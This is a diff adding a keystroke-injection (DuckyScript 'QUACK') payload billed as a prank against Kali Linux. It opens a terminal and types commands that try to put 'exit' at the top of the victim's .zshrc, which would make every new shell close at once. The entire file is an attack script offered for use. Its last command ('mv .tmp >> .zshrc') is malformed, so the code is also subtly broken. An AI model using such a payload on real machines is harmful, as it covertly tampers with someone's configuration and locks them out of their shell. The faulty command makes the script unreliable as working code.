@@ -1,0 +1,26 @@
+* REM ############################################################
+* REM #                                                          #
+* REM # Title        : This damn shell doesn't work, SO SAD! :C  #
+* REM # Author       : Aleff                                     #
+* REM # Version      : 1.0                                       #
+* REM # Category     : Prank                                     #
+* REM # Target       : Kali Linux                                #
+* REM #                                                          #
+* REM ############################################################
+
+
+* REM Requirements:
+* REM     - Nothing <3
+
+
+QUACK DELAY 1000
+QUACK CTRL-ALT t
+QUACK DELAY 2000
+
+QUACK STRING echo "exit" > .tmp
+QUACK ENTER
+QUACK STRING cat .zshrc >> .tmp
+QUACK ENTER
+QUACK STRING mv .tmp >> .zshrc
+QUACK ENTER
+QUACK ALT F4
